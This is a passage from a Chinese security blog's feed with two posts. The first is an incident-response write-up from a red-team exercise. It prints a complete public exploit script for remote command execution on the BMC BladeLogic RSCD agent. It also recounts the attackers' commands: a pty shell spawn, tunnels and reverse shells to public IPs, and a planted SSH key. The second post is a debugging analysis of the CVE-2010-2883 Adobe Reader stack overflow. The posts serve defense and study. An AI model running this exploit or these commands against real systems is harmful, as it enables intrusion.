class="line">Options:</span><br><span class="line">  -i string</span><br><span class="line">     iplist like 192.168.1.1/24</span><br><span class="line">  -p string</span><br><span class="line">     port like 80,443,8080</span><br><span class="line">  -t int</span><br><span class="line">     thread (default 100)</span><br></pre></td></tr></table></figure></p><p> <img src="/2020/05/18/护网-XXE-文件上传应急响应/3.png" alt><br> 我们发现这很明显就是个ｇｏ写的扫描器，扫的还挺快，11秒１个Ｃ段，我们发现他探测了2181端口和4750端口<br>根据和客户了解业务我们知道4750端口BMC服务器自动化RSCD系统，我们在服务器发现了一个BMC.py的文件，直觉告诉我这可能是攻击队的脚本文件，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: BMC BladeLogic RSCD agent remote exec - XMLRPC version</span><br><span class="line"># Filename: BMC_rexec.py</span><br><span class="line"># Github: https://github.com/bao7uo/bmc_bladelogic</span><br><span class="line"># Date: 2018-01-24</span><br><span class="line"># Exploit Author: Paul Taylor / Foregenix Ltd</span><br><span class="line"># Website: http://www.foregenix.com/blog</span><br><span class="line"># Version: BMC RSCD agent 8.3.00.64</span><br><span class="line"># CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011)</span><br><span class="line"># Vendor Advisory: https://docs.bmc.com/docs/ServerAutomation/87/release-notes-and-notices/flashes/notification-of-critical-security-issue-in-bmc-server-automation-cve-2016-1542-cve-2016-1543</span><br><span class="line"># Tested on: 8.3.00.64</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># BMC BladeLogic RSCD agent remote exec - XMLRPC version</span><br><span class="line"># CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011)</span><br><span class="line"></span><br><span class="line"># By Paul Taylor / Foregenix Ltd</span><br><span class="line"></span><br><span class="line"># Credit: https://github.com/ernw/insinuator-snippets/tree/master/bmc_bladelogic</span><br><span class="line"># Credit: https://github.com/yaolga</span><br><span class="line"></span><br><span class="line"># Credit: Nick Bloor for AWS image for testing :-)</span><br><span class="line"># https://github.com/NickstaDB/PoC/tree/master/BMC_RSCD_RCE</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import ssl</span><br><span class="line">import sys</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import httplib</span><br><span class="line">from requests.packages.urllib3 import PoolManager</span><br><span class="line">from requests.packages.urllib3.connection import HTTPConnection</span><br><span class="line">from requests.packages.urllib3.connectionpool import HTTPConnectionPool</span><br><span class="line">from requests.adapters import HTTPAdapter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyHTTPConnection(HTTPConnection):</span><br><span class="line">    def __init__(self, unix_socket_url, timeout=60):</span><br><span class="line">        HTTPConnection.__init__(self, HOST, timeout=timeout)</span><br><span class="line">        self.unix_socket_url = unix_socket_url</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    def connect(self):</span><br><span class="line">        self.sock = wrappedSocket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyHTTPConnectionPool(HTTPConnectionPool):</span><br><span class="line">    def __init__(self, socket_path, timeout=60):</span><br><span class="line">        HTTPConnectionPool.__init__(self, HOST, timeout=timeout)</span><br><span class="line">        self.socket_path = socket_path</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    def _new_conn(self):</span><br><span class="line">        return MyHTTPConnection(self.socket_path, self.timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyAdapter(HTTPAdapter):</span><br><span class="line">    def __init__(self, timeout=60):</span><br><span class="line">        super(MyAdapter, self).__init__()</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    def get_connection(self, socket_path, proxies=None):</span><br><span class="line">        return MyHTTPConnectionPool(socket_path, self.timeout)</span><br><span class="line"></span><br><span class="line">    def request_url(self, request, proxies):</span><br><span class="line">        return request.path_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def optParser():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                        description=&quot;Remote exec &quot; +</span><br><span class="line">                        &quot;BladeLogic Server Automation RSCD agent&quot;</span><br><span class="line">                    )</span><br><span class="line">    parser.add_argument(&quot;host&quot;, help=&quot;IP address of a target system&quot;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">            &quot;-p&quot;,</span><br><span class="line">            &quot;--port&quot;,</span><br><span class="line">            type=int,</span><br><span class="line">            default=4750,</span><br><span class="line">            help=&quot;TCP port (default: 4750)&quot;</span><br><span class="line">            )</span><br><span class="line">    parser.add_argument(&quot;command&quot;, help=&quot;Command to execute&quot;)</span><br><span class="line">    opts = parser.parse_args()</span><br><span class="line">    return opts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sendXMLRPC(host, port, packet, tlsrequest):</span><br><span class="line">    r = tlsrequest.post(</span><br><span class="line">            &apos;http://&apos; + host + &apos;:&apos; + str(port) + &apos;/xmlrpc&apos;, data=packet</span><br><span class="line">        )</span><br><span class="line">    print r.status_code</span><br><span class="line">    print r.content</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intro = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;RemoteServer.intro&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;2016-1-14-18-10-30-3920958&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;7&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;8.6.01.66&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;&quot;&quot;</span><br><span class="line">options = optParser()</span><br><span class="line">rexec = options.command</span><br><span class="line">PORT = options.port</span><br><span class="line">HOST = options.host</span><br><span class="line">rexec = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;RemoteExec.exec&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&quot;&quot;&quot; + rexec  + &quot;&quot;&quot;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">sock.sendall(&quot;TLSRPC&quot;)</span><br><span class="line">wrappedSocket = ssl.wrap_socket(sock)</span><br><span class="line"></span><br><span class="line">adapter = MyAdapter()</span><br><span class="line">s = requests.session()</span><br><span class="line">s.mount(&quot;http://&quot;, adapter)</span><br><span class="line"></span><br><span class="line">sendXMLRPC(HOST, PORT, intro, s)</span><br><span class="line">sendXMLRPC(HOST, PORT, rexec, s)</span><br><span class="line"></span><br><span class="line">wrappedSocket.close()</span><br></pre></td></tr></table></figure></p><p>通过浏览我们发现这很明显就是CVE-2016-1543的exp，这个自动化运维平台托管着几百台服务器，如果攻击队拿下这个应该算是拿到很高的分数了<br>我们在/root下发现了.sh_history，诶我一看很可疑，原来红队冰蝎进来之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br></pre></td></tr></table></figure></p><p>起了个sh的shell，ntpdate去同步时间，在各种ifconfig探测网断，网络结构，直接find去查找9631584.jsp这个木马文件，然后wget去下载 frps.ini文件进行转发，curl访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.x.x.176:8000</span><br></pre></td></tr></table></figure></p><p>端口，netstat -ano查看运行进程，又在find找9631584.jsp这个木马文件，然后回到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/export/../../../client_war.ear/client.war/xlsfiles/</span><br></pre></td></tr></table></figure></p><p>删掉了所有jsp文件和xls文件，将124.jsp重命名为xwaytest.jsp文件，回到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/export//../../../client_war.ear/client.war/xlsfiles/</span><br></pre></td></tr></table></figure></p><p>再次删掉了所有jsp文件和xls文件，将124.jsp重命名为xwaytest.jsp文件，cd到tmp目录下启动python端口以及ip扫描器对10.x.x1.1/24网断进行探测，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -efo uid,pid,ppid,pcpu,pmem,vsz,rss,osz,etime,stime,com</span><br></pre></td></tr></table></figure></p><p>来探测僵尸进行（不清楚为什么这么搞，也许是为了搞清楚系统各情况），然后又用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python对10.x1.x1.1/24发起了扫描</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.x1.x2.x/Channel/145x17</span><br></pre></td></tr></table></figure><p>分别对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x1.x.x0 10.x1.8x.3x 10.x1.x2.2x</span><br></pre></td></tr></table></figure></p><p>进行了ping的连通性测试，又对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1x.4x.x.x/24</span><br></pre></td></tr></table></figure></p><p>用python扫描器发起的扫描。对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1x.4x.8x.1/24</span><br></pre></td></tr></table></figure></p><p>进行了扫描，对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.x.x2.1/24</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>发起了扫描并输出txt文件到1011.txt中，对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.x.1/24</span><br></pre></td></tr></table></figure></p><p>发起了扫描输出文件到yunwei.txt文件中，对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.0.0</span><br></pre></td></tr></table></figure></p><p>整个b段进行了扫描并输出了txt文件到yunwei2.txt，然后起了nc监听8767反弹shell。</p><p>将自己的ssh密钥写入机器，建立test用户并设置密码，在tmp利用了BMC.py的脚本，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 127.0.0.1 -I /etc/passwd.</span><br></pre></td></tr></table></figure></p><p>也不知道这是什么迷惑行为<br>在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.1x.1x</span><br></pre></td></tr></table></figure></p><p>机器上发现攻击者使用ping检测网络连通性，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 121.201.10.53 80</span><br></pre></td></tr></table></figure></p><p>然后就find疯狂在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/export/../../../../client.war/</span><br></pre></td></tr></table></figure></p><p>找1Aa.xls以及shell.jsp的木马文件，到tmp<br>目录下对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.2x.1/24</span><br></pre></td></tr></table></figure></p><p>进行了80与445端口探测，与此同时还查看了ip地址，主机名，用户id，用户名称，用户登陆，内核版本，当前进程，对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.1x.1/24</span><br></pre></td></tr></table></figure></p><p>对445 3389端口进行了端口探测，python建立socker5代理端口82反弹到公网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip1x.2x.1x.53</span><br></pre></td></tr></table></figure></p><p>利用curl去访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1x.2x.7x5:8080/aaa</span><br></pre></td></tr></table></figure></p><p>中aaa的内容，其实aaa也没什么东西估计就是在探测tomcat版本，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/hsperfdata_root/</span><br></pre></td></tr></table></figure></p><p>下启动了ew建立隧道的动作，反弹到1x.2x.1x.53地址，接下来就是一顿反弹shell。</p><h2 id="抑制阶段"><a href="#抑制阶段" class="headerlink" title="抑制阶段"></a>抑制阶段</h2><ol><li>删除webshell后门</li><li>升级BCM到最新版本或暂时下架设备</li><li>禁用4750端口</li><li>移除隧道梯子</li><li>删除攻击者在authorized_keys留下的公钥</li><li>修改受感染机器的密码</li></ol><h2 id="根除阶段"><a href="#根除阶段" class="headerlink" title="根除阶段"></a>根除阶段</h2><p>根据攻击者收集到的信息，对十几台重要并涉及事件的主机进行排查并清楚，攻击者均已将公钥写入了authorized_keys，并在主机留下了BMC.py的exp脚本，并未发现其他攻击特征和样本。</p><h2 id="相关安全建议"><a href="#相关安全建议" class="headerlink" title="相关安全建议"></a>相关安全建议</h2><ol><li>系统、应用相关用户杜绝使用弱口令，应使用高复杂强度的密码，尽量包含大小写字母、数字、特殊符号等的混合密码，加强管理员安全意识，禁止密码重用的情况出现；</li><li>禁止服务器主动发起外部连接请求，对于需要向外部服务器推送共享数据的，应使用白名单的方式，在出口防火墙加入相关策略，对主动连接IP范围进行限制；</li><li>有效加强访问控制ACL策略，细化策略粒度，按区域按业务严格限制各个网络区域以及服务器之间的访问，采用白名单机制只允许开放特定的业务必要端口，其他端口一律禁止访问，仅管理员IP可对管理端口进行访问，如FTP、数据库服务、远程桌面等管理端口；</li><li>部署高级威胁监测设备，及时发现恶意网络流量，同时可进一步加强追踪溯源能力，对安全事件发生时可提供可靠的追溯依据；</li><li>配置并开启相关关键系统、应用日志，对系统日志进行定期异地归档、备份，避免在攻击行为发生时，导致无法对攻击途径、行为进行溯源等，加强安全溯源能力；</li><li>建议在服务器或虚拟化环境上部署虚拟化安全管理系统，提升防恶意软件、防暴力破解等安全防护能力；</li><li>建议安装相应的防病毒软件，及时对病毒库进行更新，并且定期进行全面扫描，加强服务器上的病毒清除能力；</li><li>定期开展对系统、应用以及网络层面的安全评估、渗透测试以及代码审计工作，主动发现目前系统、应用存在的安全隐患；</li><li>加强日常安全巡检制度，定期对系统配置、网络设备配合、安全日志以及安全策略落实情况进行检查，常态化信息安全工作；</li></ol><h2 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h2><p><img src="/2020/05/18/护网-XXE-文件上传应急响应/1.png" alt><br><img src="/2020/05/18/护网-XXE-文件上传应急响应/2.png" alt></p>]]></content>
    
    <summary type="html">
    
      护网应急中的一次和红队争分夺秒的较量
    
    </summary>
    
    
      <category term="HW" scheme="https://hexchristmas.github.io/tags/HW/"/>
    
      <category term="IR" scheme="https://hexchristmas.github.io/tags/IR/"/>
    
      <category term="XXE" scheme="https://hexchristmas.github.io/tags/XXE/"/>
    
      <category term="FileUpload" scheme="https://hexchristmas.github.io/tags/FileUpload/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2883栈溢出漏洞分析及复现</title>
    <link href="https://hexchristmas.github.io/2020/04/18/CVE-2010-2883%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <id>https://hexchristmas.github.io/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/</id>
    <published>2020-04-17T17:28:45.000Z</published>
    <updated>2020-04-17T17:42:30.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2883栈溢出漏洞分析及复现"><a href="#CVE-2010-2883栈溢出漏洞分析及复现" class="headerlink" title="CVE-2010-2883栈溢出漏洞分析及复现"></a>CVE-2010-2883栈溢出漏洞分析及复现</h1><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>CVE-2010-2883漏洞已经出来很久了，很多人已经分析复现过了，最近在搞pwn这块，准备把栈溢出弄一下，是adobereader中的一个0day，由于CoolType.dll中堆栈缓冲区溢出错误使攻击者通过pdf中的ttf字体在SING表中具有长字段PDF文档进行转换，当用户安全意识比较低的时候打开了具有恶意代码的pdf文件就有可能造成任意代码执行或拒绝服务。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">什么是CoolType.dll？</span><br><span class="line">Cooltype.dll全称是&quot;CoolType Typography Engine&quot;，adobe systems的一个动态链接库，属于Cooltype的一部分</span><br></pre></td></tr></table></figure></p><h2 id="0x01-受影响版本"><a href="#0x01-受影响版本" class="headerlink" title="0x01 受影响版本"></a>0x01 受影响版本</h2><ul><li>Windows&amp;Mac&amp;Unix的Adobe Reader9.3.4版本及之前</li><li>Windows&amp;Mac&amp;Unix的Adobe Acroba9.3.4版本及之前</li></ul><h2 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h2><table><thead><tr><th></th><th></th><th>使用环境</th></tr></thead><tbody><tr><td>system</td><td>Windows XP Professional SP3</td></tr><tr><td>调试器</td><td>Olldbg</td></tr><tr><td>反汇编</td><td>IDA Pro</td></tr><tr><td>漏洞版本</td><td>Adobe Reader : 9.3.4</td></tr></tbody></table><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="CoolType-dll，定位到出现漏洞的位置"><a href="#CoolType-dll，定位到出现漏洞的位置" class="headerlink" title="CoolType.dll，定位到出现漏洞的位置"></a>CoolType.dll，定位到出现漏洞的位置</h3><p><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/3.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DBF2                 push    ebp</span><br><span class="line">.text:0803DBF3                 sub     esp, 104h       ; 分配空间</span><br><span class="line">.text:0803DBF9                 lea     ebp, [esp-4]    ; strcat将执行结果保存在ebp中</span><br><span class="line">.text:0803DBFD                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DC02                 xor     eax, ebp</span><br><span class="line">.text:0803DC04                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DC0A                 push    4Ch</span><br><span class="line">.text:0803DC0C                 mov     eax, offset loc_81847C4</span><br><span class="line">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DC2E                 call    sub_8041626</span><br><span class="line">.text:0803DC33                 xor     esi, esi</span><br><span class="line">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DC39 ;   try &#123;</span><br><span class="line">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DC48 ;   &#125; // starts at 803DC39</span><br><span class="line">.text:0803DC4C ;   try &#123;</span><br><span class="line">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DC5B                 push    edi             ; int</span><br><span class="line">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DC63                 call    sub_802178F</span><br><span class="line">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class="line">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DC72                 push    edi             ; int</span><br><span class="line">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; 指向虚表的指针</span><br><span class="line">.text:0803DC76                 call    sub_8021ABE     ; 处理sing表</span><br><span class="line">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class="line">.text:0803DC7E ;   &#125; // starts at 803DC4C</span><br><span class="line">.text:0803DC80 ;   try &#123;</span><br><span class="line">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DC84                 jz      short loc_803DCBD ; 不跳转</span><br><span class="line">.text:0803DC86                 mov     ecx, [eax]      ; 版本号</span><br><span class="line">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DC8E                 jz      short loc_803DC98 ; 跳转</span><br><span class="line">.text:0803DC90                 cmp     ecx, 100h</span><br><span class="line">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class="line">.text:0803DC98</span><br><span class="line">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j</span><br><span class="line">.text:0803DC98                 add     eax, 10h        ; 寻找uniqueName，相对sing表入口偏移0x10</span><br><span class="line">.text:0803DC9B                 push    eax             ; char *</span><br><span class="line">.text:0803DC9C                 lea     eax, [ebp+108h+var_108] ; 目的地址是一段固定大小的栈空间，就是前面申请的空间</span><br><span class="line">.text:0803DC9F                 push    eax             ; char *</span><br><span class="line">.text:0803DCA0                 mov     [ebp+108h+var_108], 0 </span><br><span class="line">.text:0803DCA4                 call    strcat ;造成溢出</span><br></pre></td></tr></table></figure></p><h3 id="PdfStreamDumper分析pdf样本"><a href="#PdfStreamDumper分析pdf样本" class="headerlink" title="PdfStreamDumper分析pdf样本"></a>PdfStreamDumper分析pdf样本</h3><p><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/4.png" alt><br>我们可以看到sing数据是0x11C开始的,sing数据长度是0x1DDF，sing从真实数据偏移0x10为uniqueName域,入口偏移0x11c为sing表的真实数据，也就是从00 00 01 00开始的部分偏移0x10就能找到uniqueName域(uniqueName域是个28字节大小的结构)，执行strcat后，会将58 E0 8D AD起始的复制到ebp指定的地址中，直到遇到NULL字符串终止符，也就是strcat进行字符串拼接时没有进行长度判断，导致栈溢出</p><h3 id="010edit确定偏移位"><a href="#010edit确定偏移位" class="headerlink" title="010edit确定偏移位"></a>010edit确定偏移位</h3><p><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/5.png" alt><br>在线offset 11ch发现<br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/6.png" alt><br>从0x10开始偏移，字段是uniqueName，大小为28字节，以x00结尾<br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/7.png" alt></p><h2 id="od动态调试"><a href="#od动态调试" class="headerlink" title="od动态调试"></a>od动态调试</h2><p>先打开adobe reader,再打开od,attach到adobe reader进程上，f9运行，由于我们刚刚分析到sing地址在0803DC6D被引用，所以在0803DC6D下断点<br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/8.png" alt><br>将带有恶意程序到样本用reader打开，程序就会停在断点上面<br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/9.png" alt><br>我们可以看到ecx是指向0012EB00，到数据窗口查询指针存放到数据<br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/10.png" alt></p><table><thead><tr><th>Type</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Fixed</td><td>sfnt    version</td><td>65536 (0x0001    0000)    for    version    1.0    </td></tr><tr><td>USHORT</td><td>numTables</td><td>Number of tables    </td></tr><tr><td>USHORT</td><td>searchRange</td><td>(Maximum    power    of    2    ≤numTables)x16    </td></tr><tr><td>USHORT</td><td>entrySelector</td><td>Log2(Maximum power    of 2≤numTables)    </td></tr><tr><td>USHORT</td><td>rangeShiH</td><td>numTablesx    16-searchRange</td></tr></tbody></table><p>我们可以看到在ttf字体文件中，从0字节偏移的位置有一个表目录，这个表目录第一个字段命是sfnt version，用来声明ttf格式版本的，我们看描述可以知道1.0版本的ttf字体文件是以0x00010000来表示版本的，075E3B70处的数数据正好是0x00010000，那么我们就可以判断ecx中保存的是sing的版本好<br>调用call指令，实际上这个call实际上是处理sing的表，单步，单步<br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/11.png" alt><br><img src="/2020/04/18/CVE-2010-2883栈溢出漏洞分析及复现/12.png" alt></p>]]></content>
    
    <summary type="html">
    
